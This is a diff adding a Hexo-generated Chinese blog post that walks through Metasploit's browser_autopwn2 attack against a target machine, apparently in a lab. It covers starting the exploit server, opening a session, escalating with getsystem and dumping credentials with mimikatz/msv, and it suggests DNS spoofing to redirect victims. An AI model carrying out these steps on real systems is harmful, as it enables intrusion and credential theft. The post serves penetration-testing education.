@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>msf浏览器自动攻击 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="msf浏览器自动攻击">
+<meta property="og:type" content="article">
+<meta property="og:title" content="msf浏览器自动攻击">
+<meta property="og:url" content="http://yoursite.com/2019/04/08/msf浏览器自动攻击/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="msf浏览器自动攻击">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/img/QQ截图20190408205140.png">
+<meta property="og:image" content="http://yoursite.com/img/QQ截图20190408205822.png">
+<meta property="og:image" content="http://yoursite.com/img/QQ截图20190408210005.png">
+<meta property="og:image" content="http://yoursite.com/img/QQ截图20190408210354.png">
+<meta property="og:image" content="http://yoursite.com/img/QQ截图20190408210536.png">
+<meta property="og:image" content="http://yoursite.com/img/QQ截图20190408210354.png">
+<meta property="og:image" content="http://yoursite.com/img/QQ截图20190408211535.png">
+<meta property="og:image" content="http://yoursite.com/img/QQ截图20190408211535.png">
+<meta property="og:image" content="http://yoursite.com/img/QQ截图20190408211606.png">
+<meta property="og:image" content="http://yoursite.com/img/QQ截图20190408211645.png">
+<meta property="og:updated_time" content="2019-04-22T09:22:54.431Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="msf浏览器自动攻击">
+<meta name="twitter:description" content="msf浏览器自动攻击">
+<meta name="twitter:image" content="http://yoursite.com/img/QQ截图20190408205140.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="w-msf浏览器自动攻击" class="article article-type-w" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/04/08/msf浏览器自动攻击/" class="article-date">
+  <time datetime="2019-04-08T13:32:47.000Z" itemprop="datePublished">2019-04-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      msf浏览器自动攻击
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="msf浏览器自动攻击"><a href="#msf浏览器自动攻击" class="headerlink" title="msf浏览器自动攻击"></a>msf浏览器自动攻击</h3><a id="more"></a>
+<h4 id="首先查看数据库状态-，并启动数据库"><a href="#首先查看数据库状态-，并启动数据库" class="headerlink" title="首先查看数据库状态 ，并启动数据库"></a>首先查看数据库状态 ，并启动数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql status</span><br><span class="line">/etc/init.d/postgresql start</span><br></pre></td></tr></table></figure>
+<p><img src="/img/QQ截图20190408205140.png" alt="QQ截图20190408205140"></p>
+<h4 id="打开msf"><a href="#打开msf" class="headerlink" title="打开msf:"></a>打开msf:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<p>搜索我们需要的浏览器服务，并启动</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search  autopwn</span><br><span class="line">use auxiliary/server/browser_autopwn2</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="/img/QQ截图20190408205822.png" alt="QQ截图20190408205822"></p>
+<p><img src="/img/QQ截图20190408210005.png" alt="QQ截图20190408210005"></p>
+<h4 id="启动之后我们会获取一个msf自动分配的网址："><a href="#启动之后我们会获取一个msf自动分配的网址：" class="headerlink" title="启动之后我们会获取一个msf自动分配的网址："></a>启动之后我们会获取一个msf自动分配的网址：</h4><p><img src="/img/QQ截图20190408210354.png" alt="QQ截图20190408210354"></p>
+<h4 id="然后我们使用我们的靶机访问下个地址："><a href="#然后我们使用我们的靶机访问下个地址：" class="headerlink" title="然后我们使用我们的靶机访问下个地址："></a>然后我们使用我们的靶机访问下个地址：</h4><p><img src="/img/QQ截图20190408210536.png" alt="QQ截图20190408210536"></p>
+<h4 id="我们机子就可以监听到靶机了如图-输入如下的代码，记忆可以看到我们这个链接了"><a href="#我们机子就可以监听到靶机了如图-输入如下的代码，记忆可以看到我们这个链接了" class="headerlink" title="我们机子就可以监听到靶机了如图,输入如下的代码，记忆可以看到我们这个链接了,"></a>我们机子就可以监听到靶机了如图,输入如下的代码，记忆可以看到我们这个链接了,</h4><p><img src="/img/QQ截图20190408210354.png" alt="QQ截图20190408210354"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -l</span><br></pre></td></tr></table></figure>
+<h4 id="进入这个服务"><a href="#进入这个服务" class="headerlink" title="进入这个服务"></a>进入这个服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i  1</span><br></pre></td></tr></table></figure>
+<p><img src="/img/QQ截图20190408211535.png" alt="QQ截图20190408211535"></p>
+<h4 id="然后输入-就可以看靶机的信息了"><a href="#然后输入-就可以看靶机的信息了" class="headerlink" title="然后输入,就可以看靶机的信息了"></a>然后输入,就可以看靶机的信息了</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
+<p><img src="/img/QQ截图20190408211535.png" alt="QQ截图20190408211535"></p>
+<h4 id="然后输入"><a href="#然后输入" class="headerlink" title="然后输入"></a>然后输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br><span class="line">getsystem</span><br><span class="line">getuid</span><br><span class="line">load mimikatz</span><br><span class="line">help</span><br></pre></td></tr></table></figure>
+<p><img src="/img/QQ截图20190408211606.png" alt="QQ截图20190408211606"></p>
+<h4 id="然后看command-选择命令就可以查看对应的信息系了"><a href="#然后看command-选择命令就可以查看对应的信息系了" class="headerlink" title="然后看command,选择命令就可以查看对应的信息系了"></a>然后看command,选择命令就可以查看对应的信息系了</h4><h4 id="比如："><a href="#比如：" class="headerlink" title="比如："></a>比如：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msv</span><br></pre></td></tr></table></figure>
+<p><img src="/img/QQ截图20190408211645.png" alt="QQ截图20190408211645"></p>
+<h3 id="注释-这里我们可添加一个DNS欺骗，打开的我们的apt服务，在www目录下创建一个网页-把我们生成网站地址写进去，然就如我们之前博客所发的一样进行DNS欺骗（前面博客有），无论靶机访问那个网址都会转到我们的设置的浏览器攻击上来kni6t686"><a href="#注释-这里我们可添加一个DNS欺骗，打开的我们的apt服务，在www目录下创建一个网页-把我们生成网站地址写进去，然就如我们之前博客所发的一样进行DNS欺骗（前面博客有），无论靶机访问那个网址都会转到我们的设置的浏览器攻击上来kni6t686" class="headerlink" title="注释:这里我们可添加一个DNS欺骗，打开的我们的apt服务，在www目录下创建一个网页  把我们生成网站地址写进去，然就如我们之前博客所发的一样进行DNS欺骗（前面博客有），无论靶机访问那个网址都会转到我们的设置的浏览器攻击上来kni6t686"></a>注释:这里我们可添加一个DNS欺骗，打开的我们的apt服务，在www目录下创建一个网页  把我们生成网站地址写进去，然就如我们之前博客所发的一样进行DNS欺骗（前面博客有），无论靶机访问那个网址都会转到我们的设置的浏览器攻击上来kni6t686</h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/04/08/msf浏览器自动攻击/" data-id="cjv2e6o4i0005nwwf2pelmopr" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/04/11/sql注入/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          sql注入(一)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/04/01/HTTP三次挥手和四次挥手/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">HTTP三次挥手和四次挥手</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/04/29/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/28/一句话木马及变形/">一句话木马及变形</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/28/文件上传的七种姿势/">文件上传的七种姿势</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/15/DNSLOG在盲注中的使用/">DNSLOG在盲注中的使用</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/14/sql注入-二/">sql注入(二)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
